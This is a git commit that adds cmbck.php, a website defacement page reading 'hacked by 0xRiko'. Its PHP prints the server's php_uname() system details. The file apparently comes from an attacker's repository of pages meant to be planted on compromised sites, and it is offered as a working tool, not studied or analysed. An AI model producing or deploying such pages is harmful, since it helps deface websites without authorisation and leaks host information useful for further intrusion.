f0cf7dc08cb1857d9fd6585ca940bad3a47befb0
CyBeR CRiMiNaToR <52202656+cybercriminator@users.noreply.github.com>
2021-08-31 20:25:26 +0400

    Create cmbck.php

---
+++ cmbck.php
@@ -0,0 +1,24 @@
+
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<meta name="title" content="Hacked By 0xRiko">
+<meta name="description" content="0xRiko">
+<title>hacked by 0xRiko</title> 
+<style>
+body {
+  background: url(https://i.imgur.com/zPMi9EC.jpg) no-repeat center center fixed; 
+  -webkit-background-size: cover;
+  -moz-background-size: cover;
+  -o-background-size: cover;
+  background-size: cover;
+}
+</style>
+<body bgcolor="#000000">
+<body bgcolor="rgb(0,0,0)">
+<body bgcolor="black">
+<center>
+<br><br><br><br><br><br><br><br><br>
+<h3><font face="Verdana" color="#FFFFFF" style="font-size: 40pt"><font color="#c10000" size="8">></font>0xRiko</font></b><font face="Verdana" color="#ffffff" size="3"></h3>
+<font color="white" size="3"><?= php_uname(); ?><br><br>
+<font color="red" size="3">[ <font color="white" size="3">az-xploit<font color="red"> ]</font> <font color="red" size="3">[ <font color="white" size="3">az-sploit<font color="red"> ]</font> </center>
+</body>
+</html>
